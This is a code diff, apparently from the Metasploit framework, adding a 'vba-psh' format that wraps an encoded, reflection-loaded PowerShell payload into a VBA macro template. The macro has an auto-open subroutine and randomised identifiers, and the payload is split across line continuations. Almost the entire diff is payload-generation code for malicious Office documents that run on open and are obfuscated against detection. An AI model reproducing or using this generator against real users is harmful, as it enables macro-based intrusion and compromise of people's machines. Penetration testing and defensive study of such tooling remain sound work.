@@ -1001,6 +1001,33 @@ require 'msf/core/exe/segment_appender'
     read_replace_script_template("to_mem.vba.template", hash_sub)
   end
 
+  def self.to_powershell_vba(framework, arch, code)
+    template_path = File.join(Msf::Config.data_directory,
+                              "templates",
+                              "scripts")
+
+    powershell = Rex::Powershell::Command.cmd_psh_payload(code,
+                    arch,
+                    template_path,
+                    encode_final_payload: true,
+                    remove_comspec: true,
+                    method: 'reflection')
+
+    # Intialize rig and value names
+    rig = Rex::RandomIdentifierGenerator.new()
+    rig.init_var(:sub_auto_open)
+    rig.init_var(:var_powershell)
+
+    hash_sub = rig.to_h
+    # VBA has a maximum of 24 line continuations
+    line_length = powershell.length / 24
+    vba_psh = '"' << powershell.scan(/.{1,#{line_length}}/).join("\" _\r\n& \"") << '"'
+
+    hash_sub[:powershell] = vba_psh
+
+    read_replace_script_template("to_powershell.vba.template", hash_sub)
+  end
+
   def self.to_exe_vbs(exes = '', opts = {})
     delay   = opts[:delay]   || 5
     persist = opts[:persist] || false
@@ -1904,6 +1931,8 @@ require 'msf/core/exe/segment_appender'
     when 'vba-exe'
       exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
       Msf::Util::EXE.to_exe_vba(exe)
+    when 'vba-psh'
+      Msf::Util::EXE.to_powershell_vba(framework, arch, code)
     when 'vbs'
       exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
       Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ :persist => false }))
@@ -1950,6 +1979,7 @@ require 'msf/core/exe/segment_appender'
       "psh-cmd",
       "vba",
       "vba-exe",
+      "vba-psh",
       "vbs",
       "war"
     ]
